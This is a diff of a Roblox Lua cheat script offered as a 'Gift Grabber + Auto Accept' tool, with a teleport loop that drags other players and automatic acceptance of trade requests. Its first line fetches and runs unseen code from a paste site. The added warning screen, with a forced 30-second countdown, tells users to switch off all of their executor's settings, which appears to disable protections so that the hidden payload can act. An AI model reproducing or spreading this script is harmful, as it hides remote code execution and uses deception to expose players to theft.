@@ -1,144 +1,245 @@
--- Gift Grabber + Auto Accept (Polished Blue-Grey GUI)
+--// Warning GUI (No Scroll, Full Instructions)
 loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local PlayerGui = player:WaitForChild("PlayerGui")
 
--- GUI Setup
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "GiftGrabberGUI"
-screenGui.Parent = playerGui
+-- Remove old GUI
+if PlayerGui:FindFirstChild("WarningGUI") then
+    PlayerGui.WarningGUI:Destroy()
+end
 
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "WarningGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = PlayerGui
+
+-- Overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1, 0, 1, 0)
+overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+overlay.BackgroundTransparency = 0.35
+overlay.Parent = gui
+
+-- Main Frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 150)
-frame.Position = UDim2.new(0.5, -110, 0.5, -75)
-frame.BackgroundColor3 = Color3.fromRGB(96, 125, 139) -- Blue-grey
-frame.BorderSizePixel = 0
+frame.Size = UDim2.new(0.55, 0, 0.6, 0)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.Parent = screenGui
+frame.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = overlay
 
--- Rounded corners
-local frameCorner = Instance.new("UICorner")
-frameCorner.CornerRadius = UDim.new(0.1, 0)
-frameCorner.Parent = frame
-
--- Padding for frame
-local framePadding = Instance.new("UIPadding")
-framePadding.PaddingTop = UDim.new(0, 8)
-framePadding.PaddingBottom = UDim.new(0, 8)
-framePadding.PaddingLeft = UDim.new(0, 8)
-framePadding.PaddingRight = UDim.new(0, 8)
-framePadding.Parent = frame
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+Instance.new("UIStroke", frame).Color = Color3.fromRGB(255, 150, 150)
 
 -- Title
 local title = Instance.new("TextLabel")
-title.Text = "Script is not working on delta and krnl"
-title.Size = UDim2.new(1, 0, 0, 30)
+title.Size = UDim2.new(1, -10, 0, 40)
+title.Position = UDim2.new(0, 5, 0, 5)
 title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(236, 239, 241)
 title.Font = Enum.Font.GothamBold
-title.TextScaled = true
+title.TextSize = 26
+title.Text = "⚠️ WARNING ⚠️"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Parent = frame
 
--- Create Toggle Button Function
-local function createToggleButton(text, posY)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(1, 0, 0, 40)
-    button.Position = UDim2.new(0, 0, 0, posY)
-    button.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red OFF
-    button.Text = text .. ": OFF"
+-- Instructions (direct, not scrollable)
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -20, 1, -100)
+instructions.Position = UDim2.new(0, 10, 0, 50)
+instructions.BackgroundTransparency = 1
+instructions.TextWrapped = true
+instructions.TextXAlignment = Enum.TextXAlignment.Left
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Font = Enum.Font.GothamSemibold
+instructions.TextSize = 18
+instructions.TextColor3 = Color3.fromRGB(255, 230, 230)
+instructions.Text = [[
+If you're using Delta please turn off everything in Delta settings:
+
+1) Click the Delta button on your screen now
+2) Click the Settings tab
+3) Turn off everything
+4) Rejoin and re-execute the script
+]]
+instructions.Parent = frame
+
+-- Okay button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(1, -20, 0, 45)
+button.Position = UDim2.new(0, 10, 1, -55)
+button.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+button.Text = "Okay (30)"
+button.TextColor3 = Color3.fromRGB(220, 220, 220)
+button.TextSize = 20
+button.Font = Enum.Font.GothamBold
+button.AutoButtonColor = false
+button.Parent = frame
+
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = Color3.fromRGB(255, 150, 150)
+btnStroke.Parent = button
+
+-- Countdown lock
+local unlocked = false
+task.spawn(function()
+    for t = 30, 1, -1 do
+        button.Text = "Okay (" .. t .. ")"
+        task.wait(1)
+    end
+    unlocked = true
+    button.Text = "Okay"
+    button.AutoButtonColor = true
+    button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
     button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.Font = Enum.Font.GothamBold
-    button.TextScaled = true
-    button.Parent = frame
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0.1, 0)
-    corner.Parent = button
-
-    return button
-end
-
--- Variables
-local isGrabOn = false
-local isAutoAcceptOn = false
-local grabConnection
-local autoAcceptConnection
-
--- Loop Bring Function
-local function startLoopBring()
-    local centerChar = player.Character
-    if not centerChar or not centerChar:FindFirstChild("HumanoidRootPart") then return end
-
-    local t = 0
-    grabConnection = RunService.RenderStepped:Connect(function(dt)
-        t += dt
-        local others = Players:GetPlayers()
-        for i, plr in ipairs(others) do
-            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-                local angle = (t * 2 + (i * (2 * math.pi / #others)))
-                local radius = 8
-                local targetPos = centerChar.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
-                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos, centerChar.HumanoidRootPart.Position)
-            end
-        end
-    end)
-end
-
-local function stopLoopBring()
-    if grabConnection then
-        grabConnection:Disconnect()
-        grabConnection = nil
-    end
-end
-
--- Auto Accept Function
-local function startAutoAccept()
-    autoAcceptConnection = ReplicatedStorage.ChildAdded:Connect(function(obj)
-        if obj.Name:lower():find("trade") or obj.Name:lower():find("request") then
-            if obj:FindFirstChild("Accept") then
-                obj.Accept:FireServer() -- Auto accept trade/gift
-            end
-        end
-    end)
-end
-
-local function stopAutoAccept()
-    if autoAcceptConnection then
-        autoAcceptConnection:Disconnect()
-        autoAcceptConnection = nil
-    end
-end
-
--- Create Buttons
-local grabButton = createToggleButton("Loop Bring", 35)
-local acceptButton = createToggleButton("Auto Accept", 80)
-
--- Button Toggles
-grabButton.MouseButton1Click:Connect(function()
-    isGrabOn = not isGrabOn
-    if isGrabOn then
-        grabButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120) -- Green
-        grabButton.Text = "Loop Bring: ON"
-        startLoopBring()
-    else
-        grabButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red
-        grabButton.Text = "Loop Bring: OFF"
-        stopLoopBring()
-    end
+    btnStroke.Color = Color3.fromRGB(200, 255, 200)
 end)
 
-acceptButton.MouseButton1Click:Connect(function()
-    isAutoAcceptOn = not isAutoAcceptOn
-    if isAutoAcceptOn then
-        acceptButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
-        acceptButton.Text = "Auto Accept: ON"
-        startAutoAccept()
-    else
-        acceptButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-        acceptButton.Text = "Auto Accept: OFF"
-        stopAutoAccept()
+button.MouseButton1Click:Connect(function()
+    if not unlocked then return end
+    gui:Destroy()
+
+    -- ===================================================
+    -- Gift Grabber + Auto Accept (Polished Blue-Grey GUI)
+    -- ===================================================
+    local RunService = game:GetService("RunService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- GUI Setup
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "GiftGrabberGUI"
+    screenGui.Parent = playerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 220, 0, 150)
+    frame.Position = UDim2.new(0.5, -110, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(96, 125, 139)
+    frame.BorderSizePixel = 0
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Parent = screenGui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0.1, 0)
+
+    local framePadding = Instance.new("UIPadding")
+    framePadding.PaddingTop = UDim.new(0, 8)
+    framePadding.PaddingBottom = UDim.new(0, 8)
+    framePadding.PaddingLeft = UDim.new(0, 8)
+    framePadding.PaddingRight = UDim.new(0, 8)
+    framePadding.Parent = frame
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Text = "Script is not working on delta and krnl"
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.TextColor3 = Color3.fromRGB(236, 239, 241)
+    title.Font = Enum.Font.GothamBold
+    title.TextScaled = true
+    title.Parent = frame
+
+    -- Create Toggle Button Function
+    local function createToggleButton(text, posY)
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(1, 0, 0, 40)
+        button.Position = UDim2.new(0, 0, 0, posY)
+        button.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red OFF
+        button.Text = text .. ": OFF"
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        button.Font = Enum.Font.GothamBold
+        button.TextScaled = true
+        button.Parent = frame
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.1, 0)
+        corner.Parent = button
+
+        return button
     end
+
+    -- Variables
+    local isGrabOn = false
+    local isAutoAcceptOn = false
+    local grabConnection
+    local autoAcceptConnection
+
+    -- Loop Bring Function
+    local function startLoopBring()
+        local centerChar = player.Character
+        if not centerChar or not centerChar:FindFirstChild("HumanoidRootPart") then return end
+
+        local t = 0
+        grabConnection = RunService.RenderStepped:Connect(function(dt)
+            t += dt
+            local others = Players:GetPlayers()
+            for i, plr in ipairs(others) do
+                if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                    local angle = (t * 2 + (i * (2 * math.pi / #others)))
+                    local radius = 8
+                    local targetPos = centerChar.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos, centerChar.HumanoidRootPart.Position)
+                end
+            end
+        end)
+    end
+
+    local function stopLoopBring()
+        if grabConnection then
+            grabConnection:Disconnect()
+            grabConnection = nil
+        end
+    end
+
+    -- Auto Accept Function
+    local function startAutoAccept()
+        autoAcceptConnection = ReplicatedStorage.ChildAdded:Connect(function(obj)
+            if obj.Name:lower():find("trade") or obj.Name:lower():find("request") then
+                if obj:FindFirstChild("Accept") then
+                    obj.Accept:FireServer()
+                end
+            end
+        end)
+    end
+
+    local function stopAutoAccept()
+        if autoAcceptConnection then
+            autoAcceptConnection:Disconnect()
+            autoAcceptConnection = nil
+        end
+    end
+
+    -- Create Buttons
+    local grabButton = createToggleButton("Loop Bring", 35)
+    local acceptButton = createToggleButton("Auto Accept", 80)
+
+    -- Button Toggles
+    grabButton.MouseButton1Click:Connect(function()
+        isGrabOn = not isGrabOn
+        if isGrabOn then
+            grabButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+            grabButton.Text = "Loop Bring: ON"
+            startLoopBring()
+        else
+            grabButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            grabButton.Text = "Loop Bring: OFF"
+            stopLoopBring()
+        end
+    end)
+
+    acceptButton.MouseButton1Click:Connect(function()
+        isAutoAcceptOn = not isAutoAcceptOn
+        if isAutoAcceptOn then
+            acceptButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+            acceptButton.Text = "Auto Accept: ON"
+            startAutoAccept()
+        else
+            acceptButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            acceptButton.Text = "Auto Accept: OFF"
+            stopAutoAccept()
+        end
+    end)
 end)
